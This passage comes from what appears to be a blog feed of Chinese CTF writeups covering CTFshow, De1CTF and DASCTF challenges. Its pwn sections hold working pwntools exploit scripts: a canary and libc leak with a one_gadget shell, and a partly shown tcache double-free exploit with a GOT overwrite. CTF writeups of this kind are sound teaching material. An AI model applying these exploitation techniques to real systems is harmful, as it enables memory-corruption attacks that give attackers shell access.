class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;124.156.121.112&quot;,28081)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = <span class="number">0xf1147</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak canary</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;你怎么了？\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%9$p&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">eval</span>(p.recv(<span class="number">18</span>))</span><br><span class="line">log.success(<span class="string">&quot;canart:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#ret2main</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">56</span>+p64(canary)</span><br><span class="line">payload = payload.ljust(<span class="number">88</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += <span class="string">&#x27;\x16&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;烫&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;火炉远一点！\n&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;你怎么了？\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;%23$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">__libc_start_main_240 = <span class="built_in">eval</span>(p.recv(<span class="number">14</span>))</span><br><span class="line">log.success(<span class="string">&quot;__libc_start_main_240:&quot;</span>+<span class="built_in">hex</span>(__libc_start_main_240))</span><br><span class="line"></span><br><span class="line">libc_base = __libc_start_main_240 - <span class="number">240</span> - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">one_gadget += libc_base</span><br><span class="line">log.success(<span class="string">&quot;one_gadget:&quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">56</span>+p64(canary)</span><br><span class="line">payload = payload.ljust(<span class="number">88</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(one_gadget)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;烫&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;火炉远一点！\n&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="逆向-签到"><a href="#逆向-签到" class="headerlink" title="逆向_签到"></a>逆向_签到</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p>进来首先是逐个字符（v8）与 v7、v9 运算加密，然后结构与 v6 进行或运算。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    v8 = sub_400818((__int64)aFlag, <span class="number">0LL</span>);       <span class="comment">// 输入值需要与v7 ^ (v7 + (v7 ^ *(&amp;v9 + (signed int)v7)))相等</span></span><br><span class="line">    v6 |= v8 ^ v7 ^ (v7 + (v7 ^ *(&amp;v9 + (<span class="keyword">signed</span> <span class="keyword">int</span>)v7)));</span><br><span class="line">    v4 = v7++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v8 &amp;&amp; v8 != <span class="number">10</span> &amp;&amp; v8 != <span class="number">-1</span> );</span><br></pre></td></tr></table></figure><p>然后就是判断 v6 值，值为 0 就是正确。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v6 )                                     <span class="comment">// 需要v6等于零，就是异或为0，就是v8后面是0</span></span><br><span class="line">    sub_400828((__int64)aFailed, <span class="number">0LL</span>, v3, v4);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    sub_400828((__int64)aCorrect, <span class="number">0LL</span>, v3, v4);</span><br></pre></td></tr></table></figure><p>反推出 v6 应该每一轮加密都是 0 ，进而推出 v8 = v7 ^ (v7 + (v7 ^ *(&amp;v9 + (signed int)v7))) 。</p><p><strong>完整 exp</strong> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">0x66</span>,<span class="number">0x6d</span>,<span class="number">0x63</span>,<span class="number">0x62</span>,<span class="number">0x7f</span>,<span class="number">0x3a</span>,<span class="number">85</span>,<span class="number">106</span>,<span class="number">57</span>,<span class="number">82</span>,<span class="number">122</span>,<span class="number">55</span>,<span class="number">81</span>,<span class="number">19</span>,<span class="number">51</span>,<span class="number">35</span>,<span class="number">67</span>,<span class="number">70</span>,<span class="number">41</span>,<span class="number">61</span>,<span class="number">41</span>,<span class="number">32</span>,<span class="number">127</span>,<span class="number">28</span>,<span class="number">38</span>,<span class="number">77</span>,<span class="number">49</span>,<span class="number">20</span>,<span class="number">80</span>,<span class="number">94</span>,-<span class="number">24</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c)):</span><br><span class="line">x = i ^ ((i ^ c[i]) + i)</span><br><span class="line">print(<span class="built_in">chr</span>(x),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>[/collapse]</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTFshow </tag>
            
            <tag> 36D杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 De1CTF Writeup</title>
      <link href="archives/22e3ff4c/"/>
      <url>archives/22e3ff4c/</url>
      
        <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Misc杂烩-Misc-Chowder"><a href="#Misc杂烩-Misc-Chowder" class="headerlink" title="Misc杂烩/Misc Chowder"></a>Misc杂烩/Misc Chowder</h3><p>[collapse title=”click to see more” status=”false”]</p><p>[scode type=”yellow”]ALL hint：</p><ol><li><p>流量包中的网络连接对解题没有帮助 The network connection in pcap is not helping to the challenge</p></li><li><p>不需要访问流量里任何一个的服务器地址，所有数据都可以从流量包里直接提取 Do not need to connect the network, every data can be extracted from the pcap</p></li><li><p>In the burst test point of compressed packet password, the length of the password is 6, and the first two characters are “D” and “E”. 压缩包密码暴破考点中，密码的长度为6位，前两位为DE。</p></li></ol><p>[/scode]</p><p><strong>Examination point：Traffic Analysis,RAR Password burst and other steganography methods.</strong></p><p>First trace HTTP and find that the person who uploaded the question uploaded jpg to /test/upload_file.php. A total of 7 jpg files were uploaded.</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-05-04-r15ekLynWBDFCOeL.png"></p><p>Extract all jpg pictures from the traffic package. The last jpg is a link to a google drive.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;drive.google.com&#x2F;file&#x2F;d&#x2F;1JBdPj7eRaXuLCTFGn7AluAxmxQ4k1jvX&#x2F;view</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-05-04-NALbQioLYoCIJ8ef.png"></p><p>Inside is a zip file containing a docx document.</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-05-04-u5bTYjLsBLj19XTz.png"></p><p>There is no flag in the document. But docx is actually a compressed file, try to modify it to a zip file and then open it.</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-05-04-qV7LnwnjIxqdobox.png"></p><p>We found a compressed package, but it was encrypted. Before the hint was released, I thought the ssh key in the traffic packet (pcap) was the decompression password. You can find the record of ssh key modification in the front of pcap.</p><p>[scode type=”yellow”]hint3:In the burst test point of compressed packet password, the length of the password is 6, and the first two characters are “D” and “E”. 压缩包密码暴破考点中，密码的长度为6位，前两位为DE。</p><p>[/scode]</p><p>Blast to get the password:<code>DE34Q1</code>.Unzip to get a jpg picture, there is almost no clue. <img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-05-04-dX57XNVXF750ATdI.jpg"></p><p>Put into winhex analysis, you can find a rar compressed package hidden in jpg. I have tried to use binwalk and foremost separation. Therefore, I manually separated the compressed package.</p><p>If you use common compression software such as bandizip and winrar, you can only get 3 files. None of these three files is the final flag.</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-05-04-A6ktJFH2MMJEUoc0.png"></p><p>If you are using <a href="https://yasuo.360.cn/">360压缩</a>, you will get 4 files, one of which contains the flag.This was discovered by my teammates.</p><p>If you don’t know <a href="https://yasuo.360.cn/">360压缩</a>, continue to put rar into winhex analysis. The fourth file ffffllll.txt can be found at the end of the file.（You may find that 666.jpg is actually a png picture. But it seems useless.）</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-05-04-XHyutfqhg5jsI5Fg.png"></p><p>A string was found in front of this ffffllll.txt: STM. It is the identifier of NTFS alternate data stream in the rar file.</p><p>For how to read STM content(flag), please click here.<a href="https://ilovectf.github.io/ads/2020/05/03/De1.html">ilovectf</a></p><p>[/collapse]</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> De1CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF 安恒四月春季战 Writeup</title>
      <link href="archives/cfd73b01/"/>
      <url>archives/cfd73b01/</url>
      
        <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="6G-签到题"><a href="#6G-签到题" class="headerlink" title="6G 签到题"></a>6G 签到题</h3><p><strong>不需要下载整个文件</strong>。点击下载后，就可以停了。然后 winhex 打开下载缓存文件，查看十六进制内容，发现惊喜。</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-04-25-texpKUnZ0uJAws9h.png"></p><h3 id="blueshack"><a href="#blueshack" class="headerlink" title="blueshack"></a>blueshack</h3><p>流量分析题目，流量包是蓝牙流量。</p><p>找到一个压缩包，复制粘贴提取出来。（7z 文件头是：37 7a bc af）</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-04-25-b7T426PixNAD3grz.png"></p><p>压缩包加密，提示是蓝牙连接的 PIN 码，就返回开头选择 PIN 校验数据流</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-04-25-8RVDfETJIeqEgNd8.png"></p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><p>加密函数与校验函数如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(&amp;v5); ++i )</span><br><span class="line">    v6[i - <span class="number">112</span>] = (v6[i - <span class="number">112</span>] ^ <span class="number">6</span>) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;v5, <span class="string">&quot;akhb~chdaZrdaZudqduvdZvvv|&quot;</span>) )</span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;yes!you are right&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;try again&quot;</span>);</span><br></pre></td></tr></table></figure><p>输入字符串逐字符异或 6 + 1 加密后，与密文对比。</p><p>解密脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">m = <span class="string">&quot;akhb~chdaZrdaZudqduvdZvvv|&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    flag = <span class="built_in">chr</span>((<span class="built_in">ord</span>(i)-<span class="number">1</span>)^<span class="number">6</span>)</span><br><span class="line">    print(flag,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h3><p>主要功能函数如下：自定义输入 10  个以上的加密参数，利用参数生成一个密钥，密钥与明文异或输出。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v11 &lt;= <span class="number">9</span> )                               <span class="comment">// 加密参数个数大于9个</span></span><br><span class="line">    return &#x27;\xFF\xFF\xFF\xFF&#x27;;</span><br><span class="line">  v15 = <span class="keyword">operator</span> <span class="keyword">new</span>[](v11);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v11; ++i )                   <span class="comment">// 获取v11个加密参数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, i + v15);<span class="comment">// 加密参数在v15</span></span><br><span class="line">  v6 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;You have input sth.&quot;</span>, v5);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  v8 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;I will mix them with the enc_flag!&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">37</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; v11; ++k )                 <span class="comment">// 加密v11轮</span></span><br><span class="line">      v10 ^= *(_BYTE *)(k + v15);</span><br><span class="line">    <span class="built_in">putchar</span>(v10 ^ (<span class="keyword">unsigned</span> __int8)*(&amp;v16 + j));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;\nMaybe you have found the `flag`\n&quot;</span>, v9);</span><br></pre></td></tr></table></figure><p>这里我是<del>试</del>观察到，10 个 参数全为 1 或 2 ，输出值不变。然后根据前面 flag 形式推测 flag 结构为 flag{} 。然后密文输出第一个是 &amp; ，应该对应 f ，也就是异或 64 就解出来 flag 。</p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v16 = [<span class="number">0x26</span>,<span class="number">0x2C</span>,<span class="number">0x21</span>,<span class="number">0x27</span>,<span class="number">0x3B</span>,<span class="number">0x23</span>,<span class="number">0x22</span>,<span class="number">0x73</span>,<span class="number">0x75</span>,<span class="number">0x72</span>,<span class="number">113</span>,<span class="number">33</span>,<span class="number">36</span>,<span class="number">117</span>,<span class="number">118</span>,<span class="number">119</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">38</span>,<span class="number">114</span>,<span class="number">117</span>,<span class="number">113</span>,<span class="number">38</span>,<span class="number">34</span>,<span class="number">113</span>,<span class="number">114</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">36</span>,<span class="number">112</span>,<span class="number">115</span>,<span class="number">118</span>,<span class="number">121</span>,<span class="number">112</span>,<span class="number">35</span>,<span class="number">37</span>,<span class="number">121</span>,<span class="number">61</span>]</span><br><span class="line">enc = [<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;=&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v16:</span><br><span class="line">print(<span class="built_in">chr</span>(i^<span class="number">64</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="sales-office"><a href="#sales-office" class="headerlink" title="sales_office"></a>sales_office</h3><p><strong>考点：UAF–》DoubleFree，tcache</strong></p><p>一开始看以为利用点是在 buy 函数。创建堆失败后，结构体的堆未被删除。最后是 sell 函数没有将 free 的堆指针置零。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">  v1 = read_int(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">12</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( area[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*area[v1]);                            <span class="comment">// 存储堆</span></span><br><span class="line">    <span class="built_in">free</span>(area[v1]);                             <span class="comment">// 索引堆</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><p>题目有输出函数，就把索引堆的 fd 指针覆写为函数 got 地址。覆写的方法比较巧妙。</p><p>首先 Double Free 布置 tcache ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)<span class="comment">#维持tcache数量</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>完成效果：chunk1 index -&gt; chunk1 data –&gt; chunk1 index -&gt; chunk1 data</p><p>布置 chunk1 data fd 指向 chunk2 data fd ，然后 malloc chunk1 index ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buy(<span class="number">0x10</span>,p64(heap_base+<span class="number">0x2e0</span>))</span><br><span class="line">buy(<span class="number">0x40</span>,p64(<span class="number">0xdeadbeef</span>))</span><br></pre></td></tr></table></figure><p>修改 chunk2 index fd 指向 <a href="mailto:&#x6d;&#x61;&#x6c;&#108;&#x6f;&#99;&#64;&#103;&#111;&#116;&#x2e;&#112;&#x6c;&#x74;">&#x6d;&#x61;&#x6c;&#108;&#x6f;&#99;&#64;&#103;&#111;&#116;&#x2e;&#112;&#x6c;&#x74;</a> ，泄露函数 got 表地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buy(<span class="number">0x10</span>,p64(elf.got[<span class="string">&#x27;malloc&#x27;</span>]))<span class="comment">#chunk1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>后面修改 got 表地址方法同上。</p><h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encodig:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./sales_office&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./sales_office&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;house:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;your house:&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sell</span>(<span class="params">index</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">buy(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>) <span class="comment">#0</span></span><br><span class="line">buy(<span class="number">0x10</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">buy(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">buy(<span class="number">0x10</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x10</span>) <span class="comment">#3</span></span><br><span class="line">buy(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">sell(<span class="number">0</span>)<span class="comment">#维持tcache数量平衡</span></span><br><span class="line">sell(<span class="number">1</span>)</span><br><span class="line">sell(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span 